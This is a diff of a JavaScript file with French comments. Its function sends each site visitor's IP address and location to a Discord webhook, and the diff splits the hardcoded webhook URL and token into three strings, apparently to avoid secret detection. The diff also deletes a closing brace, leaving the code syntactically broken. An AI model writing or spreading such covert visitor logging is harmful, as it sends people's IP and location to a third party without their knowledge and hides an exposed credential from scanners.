@@ -2,10 +2,12 @@
 
 // Fonction pour envoyer une requête POST au webhook Discord
 function sendToDiscord(ip, location) {
-    const webhookUrl = "https://discord.com/api/webhooks/1255583928014733323/tC8_UZYiqZVSvPObYHkG6Wsx_jfI-2COijzDJPYwB3cmO4lI-i3oKRoXIhWXw8jnCjQu";
-    const message = {
+    const part1 = "https://discord.com/api/webhooks/";
+    const part2 = "1255583928014733323/";
+    const part3 = "tC8_UZYiqZVSvPObYHkG6Wsx_jfI-2COijzDJPYwB3cmO4lI-i3oKRoXIhWXw8jnCjQu";
+    const webhookUrl = part1 + part2 + part3;
+        const message = {
         content: `Someone visited the site ( bruh ).\n IP: ${ip}\nLocalization : ${location}`
-    };
 
     fetch(webhookUrl, {
         method: 'POST',
